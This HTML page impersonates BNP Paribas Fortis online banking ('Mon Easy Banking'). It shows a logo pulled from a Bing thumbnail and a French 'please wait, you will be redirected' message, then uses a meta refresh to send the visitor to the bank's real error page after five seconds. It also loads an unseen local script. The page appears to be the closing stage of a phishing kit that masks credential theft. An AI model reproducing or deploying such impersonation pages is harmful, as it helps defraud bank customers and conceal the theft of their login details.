<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">


<title>Mon Easy Banking, ma banque en ligne | BNP Paribas Fortis</title>
	<link rel="stylesheet" href="./layout/css/spin.css">
	<link rel="stylesheet" href="./layout/css/media.css">
	 <link
            rel="icon"
            href="data:image/vnd.microsoft.icon;base64,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AP96pgD/eqYA/3qmAP96pgD/eqYA/3qmAP96pgD/eqYA/3qmAP96pgD/h68S/5y9Mv96pgD/c54A/3OeAP9zngD/c54A/3OeAP9zngD/c54A/3OeAP9zngD/c54A/3SeAP9zngD/c54A/3OeAP9zngD/c54A/3OeAP9zngD/c54A/3OeAP9zngD/c54A/3OeAP9zngD/c54A/3OeAP9zngD/c54A/3OeAP+JsBX/ocBF/3WeBP9slgD/bJYA/2yWAP9slgD/bJYA/3ScC/9slgD/bJYA/2yWAP9slgD/gqYn/7rPhv+Ssj3/bJYA/2yWAP9slgD/bJYA/2yWAP9slgD/bJYA/2yWAP9slgD/bJYA/2yWAP9slgD/bJYA/2yWAP9slgD/bJYA/42yI/+lxFj/bpcI/2WQAP9lkAD/ZZAA/2WQAP+Cpif/sMZ+/2WQAP9lkAD/ZZAA/2WQAP95nxn/us+G/////v/m7tL/zdyn/2iRBv9lkAD/ZZAA/2WQAP9lkAD/ZZAA/2WQAP9lkAD/ZZAA/2WQAP9lkAD/ZZAA/2WQAP9lkAD/kbYx/6vHaP9nkQj/YIoA/2CKAP9figD/Yo4A/97pxv/L2qj/tsx+/7bLgv92mx//YIoA/2mRDv99ny7/l7JZ/+ju3f/3+fP/gaMx/2CKAP9gigD/X4oA/2CKAP9gigD/YIoA/2CKAP9figD/YIoA/2CKAP9gigD/YIoA/1+KAP+XuUn/rch3/2CKAP9chwD/XIcA/2mRDv+7z4v////+/////v+twYH/X4gG/1yHAP9chwD/XIcA/1yHAP9chwD/dZgp/8nWsP+ovnn/gaI5/1yHAP9chwD/XIcA/1yHAP9chwD/XIcA/1yHAP9chwD/XIcA/1yHAP9chwD/W4UA/569Xv+xy4T/XIcA/1uFAP+Sr0v/9Pjr/////v////7/9/nz/2KJDP9bhQD/W4UA/1uFAP9bhQD/W4UA/1uFAP9bhQD/Z40U/1uFAP9rkhn/X4gG/1uFAP9bhQD/W4UA/1uFAP9bhQD/W4UA/1uFAP9bhQD/W4UA/1uFAP9ahAD/pcJx/7LMkP9bhQD/XIcA/1+KAP+Ip0L/+fv1/+3y4v/1+PH/rMF8/1yHAP9chwD/XIcA/1yHAP9chwD/XIcA/1yHAP9chwD/XIcA/1yHAP9chwD/XIcA/1yHAP9chwD/XIcA/1yHAP9chwD/XIcA/1yHAP9chwD/XIcA/1yHAP+pxn//ssyQ/1+KAP9figD/X4oA/2SOBf/3+fP/c5kg/1+KAP9rkhn/X4oA/1+KAP9figD/X4oA/1+KAP9figD/X4oA/1+KAP9figD/X4oA/1+KAP9figD/X4oA/1+KAP9figD/X4oA/1+KAP9figD/X4oA/1+KAP9figD/YIoA/7DKi/+yzJD/YIoA/2KOAP9ijgD/Z5EI/8/csf9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9lkAD/tc6W/7bOk/9ijgD/Yo4A/2KOAP9kkQD/obtn/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2SSAP+50Z3/rsiB/2SSAP9kkgD/ZJIA/2SSAP9wmhP/ZJIA/2SSAP9kkgD/ZJIA/2SSAP9kkgD/ZJIA/2SSAP9kkgD/ZJIA/2SSAP9kkgD/ZJIA/2SSAP9kkgD/ZJIA/2SSAP9kkgD/ZJIA/2SSAP9kkgD/ZJIA/2SSAP9kkgD/Z5YA/7XOlv+sxnv/Z5YA/2eWAP9nlgD/Z5YA/3mjHv9nlgD/Z5YA/2eWAP9nlgD/c54S/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9smQv/ssuR/6nEdv9nlgD/Z5YA/2eWAP9nlgD/eaMe/7rPhv9pmgD/Z5YA/2eWAP+2zX//c58V/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/22bCv+tx4j/pcJx/2maAP9pmgD/aZoA/2maAP9pmgD/sst8/9Phsv9vngn/a50A/+rx2v+OskH/aZoA/2maAP9pmgD/aZoA/2maAP9pmgD/aZoA/2maAP9pmgD/aZoA/2maAP9pmgD/aZoA/2maAP9pmgD/aZoA/2maAP9pmgD/b54J/6jDgP+iwGv/a50A/2udAP9rnQD/a50A/2udAP9vnwb/3unG/+Tt0P+kwmD////+/7XNgf9rnQD/a50A/2udAP9rnQD/a50A/2udAP9rnQD/a50A/2udAP9rnQD/a50A/2udAP9rnQD/b58G/2udAP9rnQD/a50A/2udAP9vnwb/pL93/6G/Zv9tnwD/bZ8A/22fAP9tnwD/bZ8A/22fAP9+qh7/9Pjr/////v////7/6vHa/4avKv94phL/d6YQ/3uoF/+KsjL/jLM1/22fAP9tnwD/bZ8A/22fAP9tnwD/bZ8A/22fAP+Gryr/h7Aw/22fAP9tnwD/bZ8A/22fAP+eu2v/nr1e/3GiAP9xogD/caIA/3GiAP9xogD/daQC/4ewJf/T4q7////+/////v////7////+/////v/9/vz/5u7S/63Jav93pgr/caIA/3GiAP9xogD/caIA/3GiAP9xogD/caIA/5G3Nv+wy3T/caIA/3GiAP9xogD/caIA/5m3X/+evFf/eqYA/3qmAP96pgD/eqYA/4OtEv+xzG//0eGs/9/qwf/f6sH/5u7S/////v/y9un/ss1w/5G2Mf96pgD/eqYA/3qmAP96pgD/eqYA/3upBf96pgD/eqYA/3qmAP96pgD/ocJN/9HhrP96pgD/eqYA/3qmAP96pgD/lbRT/567Uf+BrQD/ga0A/4GtAP+BrQD/ga0A/4GtAP+BrQD/gKwA/4CsAP+BrQT/tM5o/+/04f+SuCj/ga0A/4GtAP+BrQD/ga0A/4GtAP+BrQD/nb46/63JYv+BrQT/ga0A/4GtAP+30HH/7fPd/4CsAP+BrQD/ga0A/4GtAP+RsEb/mbxP/4mxC/+JsQv/ibEL/4mxC/+JsQv/ibEL/4mxC/+JsQv/ibEL/4mxC/+JsQv/i7IS/5W5Kf+JsQv/ibEL/4mxC/+JsQv/ibEL/4mxC/+JsQv/wdaG/+rx2v+vyl//ibEL/9bksf/5+/X/i7IS/4mxC/+JsQv/ibEL/42tOf+Ztkz/kLYw/5C2MP+QtjD/kLYw/5C2MP+QtjD/kLYw/5C2MP+QtjD/kLYw/5C2MP+RtjH/kLYw/5C2MP+RtjH/q8do/77Uhf+yzG//pcRY/5q8Q/+RtjH/4uvJ/////v/m7tL//P36//3+/P+Wuj7/kLYw/5C2MP+QtjD/iaoy/5WyQ/+ZvE//mbxP/5m8T/+ZvE//mbxP/5m8T/+ZvE//mbxP/5m8T/+ZvE//mbxP/5m8T/+ZvE//mbxP/5m8T/+ZvE//nb5W/7zTjv/e6cb/9/nz/////v////7////+/////v////7//f78/6DAW/+ZvE//mbxP/5m8T/+HqSz/kq83/5++Zv+hwWr/ocFq/6HBav+hwWr/ocFq/6HBav+hwWr/ocFq/6HBav+hwWr/ocFq/6HBav+hwWr/ocFq/6HBav+hwWr/ocFq/6HBav+jwm7/tc6K/9Titf////7////+/////v////7/7fLi/6jFc/+hwWr/ocFq/4WmJv+OrDH/o8Fy/6nGf/+pxn//qcZ//6nGf/+pxn//qcZ//6nGf/+pxn//qcZ//6nGf/+pxn//qcZ//6nGf/+pxn//qcZ//6nGf/+pxn//qcZ//6PCbv/H2qH//P36/////v/y9un/yNut/7zTm//G2qv/ts6T/6nGf/+pxn//haYm/4moMf+lwnH/ssyQ/7LMkP+yzJD/ssyQ/7LMkP+yzJD/ssyQ/7LMkP+yzJD/ssyQ/7LMkP+yzJD/ssyQ/7LMkP+yzJD/ssyQ/6nGf/+/1Jb/7/Tl/+705//Y5cj/v9Sj/7LMkP+yzJD/ssyQ/7LMkP+yzJD/ssyQ/7LNkf+EpSr/hqYy/5++Zv+20Jr/ttCa/7bQmv+20Jr/ttCa/7bQmv+20Jr/ttCa/7bQmv+20Jr/ttCa/7bQmv+20Jr/ttCa/7bQmv+20Jr/vdSf/8PYrP+50Z3/ttCa/7bQmv+20Jr/ttCa/7bQmv+20Jr/ttCa/7bQmv+20Jr/ttCa/4amMv+BozH/j7BO/7HMjv+xzI7/scyO/7HMjv+xzI7/scyO/7HMjv+xzI7/scyO/7HMjv+xzI7/scyO/7HMjv+xzI7/scyO/7HMjv+xzI7/scyO/7HMjv+xzI7/scyO/7HMjv+xzI7/scyO/7HMjv+xzI7/scyO/7HMjv+xzI7/g6Qy/36eMv95nin/qseB/6rHgf+qx4H/qseB/6rHgf+qx4H/qseB/6rHgf+qx4H/qseB/6rHgf+qx4H/qseB/6rHgf+qx4H/qseB/6rHgf+qx4H/qseB/6rHgf+qx4H/qseB/6rHgf+qx4H/qseB/6rHgf+qx4H/qseB/6nGf/95nCX/japN/3OXI/+FpT7/iKhC/4ioQv+IqEL/iKhC/4ioQv+Ip0L/iKhC/4ioQv+IqEL/iKhC/4ioQv+IqEL/iKhC/4ioQv+IqEL/iKdC/4ioQv+IqEL/iKhC/4inQv+IqEL/iKhC/4ioQv+IqEL/iKhC/4ioQv+IqEL/gKE2/36eMv8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
        />
	<style>


@media(max-width: 768px) {

	#img_bellogo{
	width:100%;
	} 
  
  }
  	@media (min-width: 800px) {
    	#img_bellogo{
	     width:25%;
	     } 
    }
	@media (min-width: 960px) {
       #img_bellogo{
	     width:25%;
	     }
    }
    @media(min-width: 1440px) {
       #img_bellogo{
	     width:25%;
	     }
    }
    @media(min-width: 2000px) {
       #img_bellogo{
	     width:25%;
	     }
    }
</style>

	
</head>
<body>
	<div class="contenr">
		<center>
			<div class="dika">
				<img src="https://th.bing.com/th/id/OIP.1cnBEBnMvVrl0QjGbQ9EDQHaCI?pid=ImgDet&rs=1" id="img_bellogo">
				<div class="msg"><span class="titiz">Merci de patienter, Vous serez redirigé dans quelques instants....</span></div>
				<p style="text-align: center;"><img alt="" src="https://cdn-icons-png.flaticon.com/512/5972/5972778.png" style="width: 100px; height: 100px;" /></p>
          <meta http-equiv="refresh" content="5;url=https://www.bnpparibasfortis.be/local/errors/default.html?errorinfo=ID11919957388981215635">
			</div>
		</center>
		 
		<center style="margin-top:-300px">
			<div class="sk-cube-grid">
                <div class="sk-cube sk-cube1"></div>
                <div class="sk-cube sk-cube2"></div>
                <div class="sk-cube sk-cube3"></div>
                <div class="sk-cube sk-cube4"></div>
                <div class="sk-cube sk-cube5"></div>
                <div class="sk-cube sk-cube6"></div>
                <div class="sk-cube sk-cube7"></div>
                <div class="sk-cube sk-cube8"></div>
                <div class="sk-cube sk-cube9"></div>
            </div>
		</center>

<div id="content"></div>
			<!-- jQuery -->

	<script src="./layout/js/main.js"></script>	
	</div>
</body>
</html>